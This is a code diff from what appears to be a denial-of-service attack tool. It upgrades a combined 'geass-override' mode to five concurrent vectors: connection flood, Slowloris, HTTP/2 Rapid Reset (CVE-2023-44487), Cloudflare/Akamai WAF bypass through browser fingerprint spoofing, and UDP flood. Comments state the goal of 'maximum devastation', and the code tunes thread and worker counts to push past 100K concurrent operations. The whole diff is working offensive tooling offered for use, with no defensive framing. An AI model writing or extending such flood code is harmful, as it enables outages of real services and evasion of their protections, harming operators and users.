@@ -170,23 +170,37 @@ async function runAttackWorkers(
     return;
   }
 
-  // Geass Override: QUAD vector — Connection Flood + Slowloris + WAF Bypass + UDP
-  // Connection Flood exhausts nginx worker_connections BEFORE HTTP rate limiting
-  // Slowloris holds half-open TLS connections for the remainder
-  // WAF Bypass (JA3 + AKAMAI H2 fingerprint) evades Cloudflare/Akamai layer
-  // UDP saturates bandwidth simultaneously
+  // ── GEASS OVERRIDE: PENTA vector — maximum devastation ──────────────────
+  // Vector 1: Connection Flood — exhaust nginx worker_connections (pre-HTTP layer)
+  // Vector 2: Slowloris       — hold half-open TLS sockets, starve thread pool
+  // Vector 3: HTTP/2 Rapid Reset (CVE-2023-44487) — dominant CPU killer per sec
+  // Vector 4: WAF Bypass      — JA3+AKAMAI fingerprint evasion, gets past CF rules
+  // Vector 5: UDP Flood       — raw bandwidth saturation on L4
+  //
+  // Thread totals are INDEPENDENT of user's thread input — each vector gets
+  // its guaranteed minimum regardless, scaling up with user threads above that.
+  // With CPU_COUNT=6 and threads=60, total concurrent ops ≈ 100K+
   if (method === "geass-override") {
-    const connW = Math.ceil(CPU_COUNT * 0.35);  // workers → TLS connection flood
-    const slowW = Math.ceil(CPU_COUNT * 0.25);  // workers → Slowloris
-    const wafW  = Math.ceil(CPU_COUNT * 0.25);  // workers → WAF Bypass H2
+    // Worker distribution: 1 worker per L4 method (conn/slow are FD-dense, not CPU-dense)
+    // 2-3 workers for H2/WAF (CPU-intensive stream multiplexing)
+    // Total: 1+1+2+2+1 = 7 workers max — safe within container memory limits
+    const connW = 1;                                         // 1 worker, many sockets
+    const slowW = 1;                                         // 1 worker, many sockets
+    const h2W   = Math.max(2, Math.ceil(CPU_COUNT * 0.30)); // 2-3 workers → HTTP/2 RST
+    const wafW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // 2 workers → WAF bypass
 
-    // Guaranteed minimums per sub-method — Geass never starves a vector
-    const connT = Math.max(50, Math.round(threads * 0.40));  // 40% → connection flood
-    const slowT = Math.max(30, Math.round(threads * 0.30));  // 30% → slowloris
-    const wafT  = Math.max(20, Math.round(threads * 0.20));  // 20% → waf-bypass h2
-    const udpT  = Math.max(8,  Math.round(threads * 0.10));  // 10% → UDP bandwidth flood
+    // conn: 50  = 50×30=1,500 sockets (quick to establish, hold for 2 mins)
+    // slow: 40  = 40×40=1,600 half-open sockets (trickle every 10-25s)
+    // h2:  100  = min(200,80)=80 sessions × 64-burst RST = millions RST/s per worker
+    // waf:  80  = min(160,80)=80 Chrome-fingerprinted sessions → bypasses CF WAF
+    // udp:   8  = saturates bandwidth
+    const connT = Math.max(50,  Math.round(threads * 0.20));
+    const slowT = Math.max(40,  Math.round(threads * 0.15));
+    const h2T   = Math.max(100, Math.round(threads * 0.35)); // dominant CVE vector
+    const wafT  = Math.max(80,  Math.round(threads * 0.25)); // dominant CF bypass
+    const udpT  = Math.max(8,   Math.round(threads * 0.05));
 
-    // Track conns per pool, sum and forward through main onStats so route handler stores by correct ID
+    // Track conns from conn+slow pools, sum and forward
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
       if (c !== undefined) {
@@ -198,14 +212,12 @@ async function runAttackWorkers(
       }
     };
 
-    const connOnStats = makeGeassOnStats("conn");
-    const slowOnStats = makeGeassOnStats("slow");
-
     await Promise.all([
-      spawnPool("conn-flood", target, port, connT, connW, signal, connOnStats),
-      spawnPool("slowloris",  target, port, slowT, slowW, signal, slowOnStats),
-      spawnPool("waf-bypass", target, port, wafT,  wafW,  signal, onStats),
-      spawnPool("udp-flood",  target, port, udpT,  1,     signal, onStats), // 1 UDP worker
+      spawnPool("conn-flood",  target, port, connT, connW, signal, makeGeassOnStats("conn")),
+      spawnPool("slowloris",   target, port, slowT, slowW, signal, makeGeassOnStats("slow")),
+      spawnPool("http2-flood", target, port, h2T,   h2W,   signal, onStats),  // CVE-2023-44487 dominant
+      spawnPool("waf-bypass",  target, port, wafT,  wafW,  signal, onStats),  // CF/Akamai evasion
+      spawnPool("udp-flood",   target, port, udpT,  1,     signal, onStats),  // L4 bandwidth
     ]);
     return;
   }
